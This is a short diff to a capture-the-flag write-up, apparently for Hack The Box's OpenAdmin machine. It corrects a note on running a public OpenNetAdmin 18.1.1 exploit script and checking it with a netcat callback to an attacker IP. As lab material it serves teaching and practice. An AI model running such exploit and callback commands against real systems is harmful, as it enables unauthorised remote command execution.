@@ -34,7 +34,7 @@ Googling `ona 18.1.1 exploit` should yield you [this first result](https://www.e
 
 The exploit basically gives you a shell with no feedback (as in no stdout). You can verify whether it works by triggering a callback to your machine.
 
-Example: running the exploit to point at `http://openadmin.htb/ona/` and running a nc callback `nc -nc <ur_ip> 4444` (Note: somehow you must add a `\` at the end or the URL for this to work)
+Example: running the exploit to point at `http://openadmin.htb/ona/` and running a nc callback `nc -nc <ur_ip> 4444` (Note: somehow you must add a `/` at the end of the URL for this to work)
 ```
 kali@kali:~$ ./ona.sh http://openadmin.htb/ona/
 $ nc -nv 10.10.14.64 4444
